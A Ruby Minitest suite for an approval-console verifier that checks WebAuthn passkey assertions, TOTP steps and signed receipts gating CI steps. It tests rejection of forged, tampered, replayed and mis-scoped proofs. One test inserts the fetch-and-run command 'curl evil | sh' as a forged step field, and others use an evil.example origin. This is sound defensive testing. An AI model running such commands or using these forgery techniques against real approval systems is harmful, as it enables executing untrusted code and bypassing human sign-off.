# frozen_string_literal: true

require "minitest/autorun"
require_relative "../scripts/approval_console/canonical"
require_relative "../scripts/approval_console/verifier"
require_relative "support/soft_authenticator"

class ApprovalConsoleVerifierTest < Minitest::Test
  Canonical = ApprovalConsole::Canonical
  Verifier = ApprovalConsole::Verifier

  RP_ID = "abc123.lambda-url.us-east-1.on.aws"
  MACHINE = "11111111-2222-4333-8444-555555555555"
  REQUEST = "99999999-8888-4777-8666-555555555555"
  SHA = "a" * 40
  FIELDS = { "command" => "make up", "args" => %w[a b] }.freeze
  STEP = 7

  def setup
    @passkey = SoftAuthenticator.new
    @receipts = SoftReceiptSigner.new
    @body = Canonical.build(body_attrs)
    @digest = Canonical.step_digest(FIELDS)
  end

  def body_attrs(overrides = {})
    { type: "step", machine_id: MACHINE, repo: "github.com/acme/app", sha: SHA, profile: "web",
      request_id: REQUEST, created_at: "2026-11-18T12:00:00Z", expires_at: "2026-11-18T12:30:00Z",
      items: [ { step: "boot.up", fields: FIELDS } ] }.merge(overrides)
  end

  def expected(overrides = {})
    { type: "step", machine_id: MACHINE, repo: "github.com/acme/app", sha: SHA, profile: "web",
      items: [ { step: "boot.up", digest: @digest } ] }.merge(overrides)
  end

  def verifier(passkey: @passkey, receipt_key: @receipts.public_pem, rp_id: RP_ID)
    Verifier.new(rp_id: rp_id, credentials: passkey ? passkey.pinned : {}, receipt_public_key: receipt_key)
  end

  def proof(body: @body, **assert_opts)
    { "kind" => "webauthn+totp", "body" => body, "totp_step" => STEP }
      .merge(@passkey.assert(body, rp_id: RP_ID, **assert_opts))
  end

  def receipt_for(proof, **overrides)
    assertion = Digest::SHA256.hexdigest(%w[authenticator_data client_data_json signature].map { |key| Base64Url.decode(proof[key]) }.join)
    fields = { "v" => 1, "kind" => proof["kind"], "machine_id" => MACHINE, "request_id" => REQUEST,
               "body_sha256" => Canonical.body_sha256(proof["body"]), "assertion_sha256" => assertion,
               "totp_step" => proof["totp_step"], "channel" => "console", "accepted_at" => "2026-11-18T12:05:00Z" }
    @receipts.receipt(fields.merge(overrides))
  end

  module Base64Url
    def self.decode(text) = (text.tr("-_", "+/") + ("=" * ((4 - (text.length % 4)) % 4))).unpack1("m0")
  end

  def assert_rejected(result, pattern)
    refute_predicate result, :ok?, "expected a rejection"
    assert_match pattern, result.reason
  end

  def test_accepts_a_valid_passkey_proof
    result = verifier.verify(proof, expected: expected)
    assert_predicate result, :ok?, result.reason
    assert_equal :passkey, result.level
    assert_equal STEP, result.totp_step
  end

  def test_accepts_an_ed25519_passkey
    @passkey = SoftAuthenticator.new(alg: :ed25519)
    result = verifier.verify(proof, expected: expected)
    assert_predicate result, :ok?, result.reason
  end

  def test_accepts_a_proof_with_a_valid_receipt
    full = proof
    full["receipt"] = receipt_for(full)
    result = verifier.verify(full, expected: expected, require_receipt: true)
    assert_predicate result, :ok?, result.reason
    assert_equal :receipt, result.level
  end

  def test_still_verifies_after_the_request_expired
    # Offline verification has no clock: the console enforced expiry at approval time.
    assert_predicate verifier.verify(proof, expected: expected), :ok?
  end

  def test_rejects_a_cleared_user_verification_flag
    assert_rejected verifier.verify(proof(uv: false), expected: expected), /user verification/
  end

  def test_rejects_a_cleared_user_presence_flag
    assert_rejected verifier.verify(proof(up: false), expected: expected), /user presence/
  end

  def test_rejects_the_wrong_rp_id
    assert_rejected verifier.verify(proof(hash_rp_id: "evil.example"), expected: expected), /rpIdHash/
    assert_rejected verifier(rp_id: "evil.example").verify(proof, expected: expected), /origin/
  end

  def test_rejects_a_wrong_origin
    assert_rejected verifier.verify(proof(origin: "https://evil.example"), expected: expected), /origin/
  end

  def test_rejects_a_wrong_ceremony_type
    assert_rejected verifier.verify(proof(type: "webauthn.create"), expected: expected), /webauthn\.get/
  end

  def test_rejects_a_challenge_for_another_body
    other = Canonical.build(body_attrs(sha: "b" * 40))
    assert_rejected verifier.verify(proof(challenge: Canonical.challenge(other)), expected: expected), /challenge/
  end

  def test_rejects_a_body_changed_by_one_byte
    tampered = @body.sub("make up", "make uq")
    signed = proof
    signed["body"] = tampered
    result = verifier.verify(signed, expected: expected)
    refute_predicate result, :ok?
  end

  def test_rejects_a_one_byte_change_even_when_the_body_still_parses_and_digests
    # Change a signed field the gate also expects, leaving a valid canonical body.
    forged = Canonical.build(body_attrs(repo: "github.com/acme/appx"))
    signed = proof
    signed["body"] = forged
    assert_rejected verifier.verify(signed, expected: expected("repo" => "github.com/acme/appx")), /challenge/
  end

  def test_rejects_a_credential_that_is_not_pinned
    assert_rejected verifier(passkey: nil).verify(proof, expected: expected), /not pinned/
  end

  def test_rejects_the_wrong_key_for_a_pinned_credential
    other = SoftAuthenticator.new
    impostor = Verifier.new(rp_id: RP_ID, credentials: { @passkey.credential_id => SoftAuthenticator.b64(other.cose_public_key) })
    assert_rejected impostor.verify(proof, expected: expected), /signature/
  end

  def test_rejects_an_assertion_signed_by_a_different_key
    stranger = SoftAuthenticator.new
    assert_rejected verifier.verify(proof(sign_key: stranger.key), expected: expected), /signature/
  end

  def test_rejects_a_tampered_signature_and_authenticator_data
    signed = proof
    signed["signature"] = SoftAuthenticator.b64(Base64Url.decode(signed["signature"]).tap { |sig| sig.setbyte(10, sig.getbyte(10) ^ 1) })
    refute_predicate verifier.verify(signed, expected: expected), :ok?

    signed = proof
    data = Base64Url.decode(signed["authenticator_data"])
    data.setbyte(36, data.getbyte(36) ^ 1)
    signed["authenticator_data"] = SoftAuthenticator.b64(data)
    assert_rejected verifier.verify(signed, expected: expected), /signature/
  end

  def test_rejects_a_wrong_head_sha
    assert_rejected verifier.verify(proof, expected: expected(sha: "c" * 40)), /sha does not match/
  end

  def test_rejects_a_proof_copied_to_another_repo_profile_machine_or_type
    assert_rejected verifier.verify(proof, expected: expected(repo: "github.com/acme/other")), /repo/
    assert_rejected verifier.verify(proof, expected: expected(profile: "api")), /profile/
    assert_rejected verifier.verify(proof, expected: expected(profile: nil)), /profile/
    assert_rejected verifier.verify(proof, expected: expected(machine_id: "00000000-0000-4000-8000-000000000000")), /machine_id/
    assert_rejected verifier.verify(proof, expected: expected(type: "override")), /type/
  end

  def test_rejects_a_changed_item_set_or_step_digest
    assert_rejected verifier.verify(proof, expected: expected(items: [ { step: "boot.up", digest: "f" * 64 } ])), /items/
    assert_rejected verifier.verify(proof, expected: expected(items: [ { step: "boot.down", digest: @digest } ])), /items/
    extra = expected(items: [ { step: "boot.up", digest: @digest }, { step: "boot.down", digest: @digest } ])
    assert_rejected verifier.verify(proof, expected: extra), /items/
  end

  def test_rejects_a_body_whose_digest_was_not_recomputed_from_its_fields
    forged = JSON.parse(@body)
    forged["items"][0]["fields"]["command"] = "curl evil | sh"
    body = Canonical.serialize(forged)
    result = verifier.verify(proof(body: body).merge("body" => body), expected: expected)
    assert_rejected result, /digest does not match/
  end

  def test_rejects_an_invalid_lifetime
    assert_raises(Canonical::Invalid) { Canonical.build(body_attrs(expires_at: "2026-11-18T13:00:01Z")) }
    long = JSON.parse(@body).merge("expires_at" => "2026-11-18T14:00:00Z")
    body = Canonical.serialize(long)
    assert_rejected verifier.verify(proof(body: body).merge("body" => body), expected: expected), /lifetime/
    inverted = Canonical.serialize(JSON.parse(@body).merge("expires_at" => "2026-11-18T11:00:00Z"))
    assert_rejected verifier.verify(proof(body: inverted).merge("body" => inverted), expected: expected), /expires_at/
  end

  def test_override_reason_must_match
    body = Canonical.build(body_attrs(type: "override", reason: "CI is down").reject { |key, _| key == :items })
    ok = { "kind" => "webauthn+totp", "body" => body, "totp_step" => STEP }.merge(@passkey.assert(body, rp_id: RP_ID))
    base = { type: "override", machine_id: MACHINE, repo: "github.com/acme/app", sha: SHA, profile: "web" }
    assert_predicate verifier.verify(ok, expected: base.merge(reason: "CI is down")), :ok?
    assert_rejected verifier.verify(ok, expected: base.merge(reason: "because")), /reason/
  end

  def test_rejects_malformed_proofs
    assert_rejected verifier.verify({ "kind" => "magic" }, expected: expected), /kind/
    assert_rejected verifier.verify(proof.merge("body" => nil), expected: expected), /body/
    assert_rejected verifier.verify(proof.merge("totp_step" => "7"), expected: expected), /totp_step/
    assert_rejected verifier.verify(proof.merge("signature" => "***"), expected: expected), /base64url/
    assert_rejected verifier.verify(proof.merge("authenticator_data" => "AAAA"), expected: expected), /too short/
  end

  # Receipts

  def test_rejects_a_missing_receipt_when_one_is_required
    assert_rejected verifier.verify(proof, expected: expected, require_receipt: true), /receipt is required/
  end

  def test_rejects_a_receipt_signed_by_another_key
    signed = proof
    payload = JSON.parse(receipt_for(signed)["payload"])
    signed["receipt"] = @receipts.receipt(payload, key: OpenSSL::PKey::EC.generate("prime256v1"))
    assert_rejected verifier.verify(signed, expected: expected), /receipt signature/
  end

  def test_rejects_a_receipt_when_no_key_is_pinned
    signed = proof
    signed["receipt"] = receipt_for(signed)
    assert_rejected verifier(receipt_key: nil).verify(signed, expected: expected), /no receipt public key/
  end

  def test_rejects_a_receipt_with_a_tampered_payload
    signed = proof
    signed["receipt"] = receipt_for(signed).merge("payload" => receipt_for(signed)["payload"].sub('"totp_step":7', '"totp_step":8'))
    assert_rejected verifier.verify(signed, expected: expected), /receipt signature/
  end

  def test_rejects_a_receipt_that_disagrees_with_the_record
    {
      "body_sha256" => "e" * 64, "assertion_sha256" => "e" * 64, "totp_step" => 8,
      "machine_id" => "00000000-0000-4000-8000-000000000000", "channel" => "terminal", "kind" => "totp-terminal",
      "request_id" => "00000000-0000-4000-8000-000000000001"
    }.each do |field, value|
      signed = proof
      signed["receipt"] = receipt_for(signed, field => value)
      assert_rejected verifier.verify(signed, expected: expected), /receipt #{field}/
    end
  end

  def test_rejects_a_receipt_replayed_from_another_approval
    first = proof
    first["receipt"] = receipt_for(first)
    second = proof
    second["receipt"] = first["receipt"]
    assert_rejected verifier.verify(second, expected: expected), /receipt assertion_sha256/
  end

  # Terminal proofs

  def terminal_proof(body: @body)
    { "kind" => "totp-terminal", "body" => body, "totp_step" => STEP, "receipt" => nil }
  end

  def terminal_receipt(proof, **overrides)
    fields = { "v" => 1, "kind" => "totp-terminal", "machine_id" => MACHINE, "request_id" => REQUEST,
               "body_sha256" => Canonical.body_sha256(proof["body"]), "assertion_sha256" => nil,
               "totp_step" => STEP, "channel" => "terminal", "accepted_at" => "2026-11-18T12:05:00Z" }
    @receipts.receipt(fields.merge(overrides))
  end

  def test_a_terminal_proof_without_a_receipt_passes_locally_only
    result = verifier.verify(terminal_proof, expected: expected)
    assert_predicate result, :ok?
    assert_equal :local, result.level
    assert_rejected verifier.verify(terminal_proof, expected: expected, require_receipt: true), /receipt is required/
  end

  def test_a_synced_terminal_proof_passes_remote
    synced = terminal_proof
    synced["receipt"] = terminal_receipt(synced)
    result = verifier.verify(synced, expected: expected, require_receipt: true)
    assert_predicate result, :ok?, result.reason
    assert_equal :receipt, result.level
  end

  def test_a_hand_fabricated_terminal_receipt_is_rejected
    forged = terminal_proof
    forged["receipt"] = terminal_receipt(forged).merge("sig" => SoftAuthenticator.b64("x" * 70))
    assert_rejected verifier.verify(forged, expected: expected, require_receipt: true), /receipt signature/
    own_key = OpenSSL::PKey::EC.generate("prime256v1")
    forged["receipt"] = @receipts.receipt(JSON.parse(terminal_receipt(forged)["payload"]), key: own_key)
    assert_rejected verifier.verify(forged, expected: expected, require_receipt: true), /receipt signature/
  end

  def test_a_terminal_receipt_cannot_back_a_passkey_proof
    signed = proof
    signed["receipt"] = terminal_receipt(signed)
    assert_rejected verifier.verify(signed, expected: expected), /receipt (kind|channel|assertion_sha256)/
  end

  def test_a_terminal_proof_still_checks_the_context
    assert_rejected verifier.verify(terminal_proof, expected: expected(sha: "c" * 40)), /sha/
  end

  # Required context and malformed input

  def test_rejects_an_empty_expected_context
    assert_rejected verifier.verify(proof, expected: {}), /missing/
  end

  def test_rejects_each_required_key_dropped_from_expected
    %i[type machine_id repo sha profile items].each do |key|
      assert_rejected verifier.verify(proof, expected: expected.reject { |name, _| name == key }), /missing|unknown type/
    end
  end

  def test_rejects_each_required_payload_key_dropped_for_other_types
    cases = {
      "override" => [ { reason: "CI is down" }, %i[reason] ],
      "prod-op" => [ { summary: "rotate", argv: [ "ruby", "r.rb" ] }, %i[summary argv] ],
      "carve-out" => [ { summary: "merge", pr_url: "https://github.com/a/b/pull/1" }, %i[summary pr_url] ]
    }
    cases.each do |type, (payload, keys)|
      body = Canonical.build(body_attrs(type: type).reject { |key, _| key == :items }.merge(payload))
      signed = { "kind" => "webauthn+totp", "body" => body, "totp_step" => STEP }.merge(@passkey.assert(body, rp_id: RP_ID))
      full = expected(type: type).reject { |key, _| key == :items }.merge(payload)
      assert_predicate verifier.verify(signed, expected: full), :ok?, type
      keys.each do |key|
        assert_rejected verifier.verify(signed, expected: full.reject { |name, _| name == key }), /missing/
      end
    end
  end

  def test_rejects_an_unknown_expected_type
    assert_rejected verifier.verify(proof, expected: expected(type: "bogus")), /type/
  end

  def test_rejects_a_non_object_proof_or_expected
    [ nil, [], "proof", 7 ].each do |bad|
      assert_rejected verifier.verify(bad, expected: expected), /not an object/
    end
    [ nil, [], "x" ].each do |bad|
      assert_rejected verifier.verify(proof, expected: bad), /not an object/
    end
  end

  def test_rejects_a_proof_missing_fields
    %w[kind body totp_step authenticator_data client_data_json signature credential_id].each do |key|
      result = verifier.verify(proof.reject { |name, _| name == key }, expected: expected)
      refute_predicate result, :ok?, key
    end
    refute_predicate verifier.verify({}, expected: expected), :ok?
  end

  def test_rejects_malformed_item_shapes
    [ nil, "x", [], [ nil ], [ "x" ], [ {} ], [ { step: 1, digest: "a" } ], [ { step: "boot.up" } ] ].each do |items|
      refute_predicate verifier.verify(proof, expected: expected(items: items)), :ok?, items.inspect
    end
  end

  def test_accepts_raw_cose_bytes_for_a_pinned_credential
    [ SoftAuthenticator.new, SoftAuthenticator.new(alg: :ed25519) ].each do |passkey|
      @passkey = passkey
      raw = Verifier.new(rp_id: RP_ID, credentials: { passkey.credential_id => passkey.cose_public_key })
      result = raw.verify(proof, expected: expected)
      assert_predicate result, :ok?, result.reason
    end
  end

  def test_rejects_a_non_string_pinned_credential
    odd = Verifier.new(rp_id: RP_ID, credentials: { @passkey.credential_id => 7 })
    assert_rejected odd.verify(proof, expected: expected), /pinned key/
  end
end
